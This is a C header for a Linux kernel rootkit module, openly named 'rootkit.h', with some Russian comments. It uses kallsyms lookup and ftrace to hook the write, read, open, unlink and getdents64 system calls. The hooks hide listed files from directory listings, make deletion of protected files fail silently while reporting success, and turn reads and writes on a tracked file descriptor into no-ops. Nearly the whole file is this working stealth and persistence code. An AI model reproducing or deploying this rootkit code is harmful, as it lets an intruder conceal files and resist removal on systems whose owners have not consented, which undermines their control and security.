#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <asm/ptrace.h>
#include <linux/fcntl.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/kprobes.h>
#include <linux/string.h>

#define FILE_NAME (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)

#define DBG(fmt, ...) \
printk(KERN_INFO "DBG: %s(%d): " fmt "\n", FILE_NAME, __LINE__, ##__VA_ARGS__)

#define MAX_BUF_SIZE 1000

static struct proc_dir_entry *proc_file_hidden;
static struct proc_dir_entry *proc_file_protected;

extern char hidden_files[100][100];
extern int hidden_index;
extern char protected_files[100][100];
extern int protected_index;

static int read_index = 0;
static int write_index = 0;
static unsigned int major;
static unsigned int minor;
static struct class *fake_class;
static struct cdev fake_cdev;
static short fs_hidden = 1;
static short fs_protect = 1;

ssize_t fake_write(struct file *file, const char __user *buf, size_t count, loff_t *offset);

static struct file_operations fake_fops = {
	.write = fake_write,
};

int check_fs_blocklist(char *input);
int check_fs_hidelist(char *input);

static unsigned int target_fd = 0;
static unsigned int target_pid = 0;

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
extern kallsyms_lookup_name_t kallsyms_lookup_name_ptr;

int init_kallsyms(void);

static unsigned long lookup_name(const char *name)
{
    if (!kallsyms_lookup_name_ptr) {
        DBG("kallsyms_lookup_name_ptr not initialized");
        return 0;
    }
    return kallsyms_lookup_name_ptr(name);
}

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;
	
	unsigned long address;
	struct ftrace_ops ops;
};

#ifndef MCOUNT_INSN_SIZE
#define MCOUNT_INSN_SIZE 5
#endif

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);
	
	if (!hook->address) {
		DBG("unresolved symbol: %s, trying alternatives\n", hook->name);
		// Попробуем альтернативные имена
		char alt_name[128];
		// Попробуем __do_sys_* вместо __x64_sys_*
		if (strncmp(hook->name, "__x64_sys_", 10) == 0) {
			snprintf(alt_name, sizeof(alt_name), "__do_sys_%s", hook->name + 10);
			hook->address = lookup_name(alt_name);
		}
		// Попробуем sys_* без префикса
		if (!hook->address && strncmp(hook->name, "__x64_sys_", 10) == 0) {
			snprintf(alt_name, sizeof(alt_name), "sys_%s", hook->name + 10);
			hook->address = lookup_name(alt_name);
		}
		if (!hook->address) {
			DBG("unresolved symbol: %s (all alternatives failed)\n", hook->name);
			return -ENOENT;
		}
		DBG("resolved via alternative: %s -> %lx\n", hook->name, hook->address);
	}
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
	
	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs;
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
	
	regs = ftrace_get_regs(fregs);
	if (!regs)
		return;
	
	regs->ip = (unsigned long)hook->function;
}

int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

static char *get_filename(const char __user *filename)
{
	char *kernel_filename = NULL;
	kernel_filename = kmalloc(4096, GFP_KERNEL);
	if (!kernel_filename)
	return NULL;
	
	if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
		kfree(kernel_filename);
		return NULL;
	}
	return kernel_filename;
}

static asmlinkage long (*real_sys_write)(struct pt_regs *regs);
static asmlinkage long fh_sys_write(struct pt_regs *regs)
{
	long ret = 0;
	struct task_struct *task;
	task = current;
	
	if (task->pid == target_pid && regs->di == target_fd)
	{
		return 0;
	}
	
	ret = real_sys_write(regs);
	return ret;
}

static asmlinkage long (*real_sys_read)(struct pt_regs *regs);
static asmlinkage long fh_sys_read(struct pt_regs *regs)
{
	long ret = 0;
	struct task_struct *task = current;
	
	if (task->pid == target_pid && regs->di == target_fd)
	{
		return 0;
	}
	
	ret = real_sys_read(regs);
	return ret;
}

static asmlinkage long (*real_sys_open)(struct pt_regs *regs);
static asmlinkage long fh_sys_open(struct pt_regs *regs)
{
	long ret;
	char *kernel_filename;
	struct task_struct *task;
	task = current;
	kernel_filename = get_filename((void*) regs->di);
	
	if (!kernel_filename)
	{
		return real_sys_open(regs);
	}
	
	if (check_fs_blocklist(kernel_filename))
	{
		DBG("our file is opened by process with id: %d", task->pid);
		DBG("opened file : '%s'", kernel_filename);
		kfree(kernel_filename);
		ret = real_sys_open(regs);
		DBG("fd returned is %ld", ret);
		if (ret >= 0)
		{
			target_fd = ret;
			target_pid = task->pid;
		}
		return ret;
	}
	
	kfree(kernel_filename);
	ret = real_sys_open(regs);
	
	return ret;
}

static asmlinkage long (*real_sys_unlink)(struct pt_regs *regs);
static asmlinkage long fh_sys_unlink(struct pt_regs *regs)
{
	long ret = 0;
	char *kernel_filename = get_filename((void*) regs->di);
	
	if (!kernel_filename)
	{
		return real_sys_unlink(regs);
	}
	
	if (check_fs_blocklist(kernel_filename))
	{
		ret = 0;
		kfree(kernel_filename);
		return ret;
	}
	
	kfree(kernel_filename);
	ret = real_sys_unlink(regs);
	
	return ret;
}

static asmlinkage long (*real_sys_getdents64)(const struct pt_regs *);
static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *previous_dir = NULL, *current_dir, *dirent_ker = NULL;
	unsigned long offset = 0;
	int ret = real_sys_getdents64(regs);
	
	if (ret <= 0)
	{
		return ret;
	}
	
	dirent_ker = kmalloc(ret, GFP_KERNEL);
	
	if (dirent_ker == NULL)
	{
		return ret;
	}
	
	if (copy_from_user(dirent_ker, dirent, ret) != 0)
	{
		kfree(dirent_ker);
		return ret;
	}
	
	while (offset < ret)
	{
		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
		
		if (check_fs_hidelist(current_dir->d_name))
		{
			if (current_dir == dirent_ker)
			{
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + 
				current_dir->d_reclen, ret);
				continue;
			}
			if (previous_dir)
			{
				previous_dir->d_reclen += current_dir->d_reclen;
			}
		}
		else
		{
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}
	if (copy_to_user(dirent, dirent_ker, ret) != 0)
	{
		kfree(dirent_ker);
		return ret;
	}
	kfree(dirent_ker);
	return ret;
}

#define SYSCALL_NAME(name) ("__x64_sys_" name)

#define HOOK(_name, _function, _original) \
{ \
	.name = SYSCALL_NAME(_name), \
	.function = (_function), \
	.original = (_original), \
}

static struct ftrace_hook demo_hooks[] = {
	HOOK("write", fh_sys_write, &real_sys_write),
	HOOK("read", fh_sys_read, &real_sys_read),
	HOOK("open", fh_sys_open, &real_sys_open),
	HOOK("unlink", fh_sys_unlink, &real_sys_unlink),
	HOOK("getdents64", fh_sys_getdents64, &real_sys_getdents64)
};

static int start_hook_resources(void)
{
	int err;
	err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
	if (err)
	{
		return err;
	}
	return 0;
}

#endif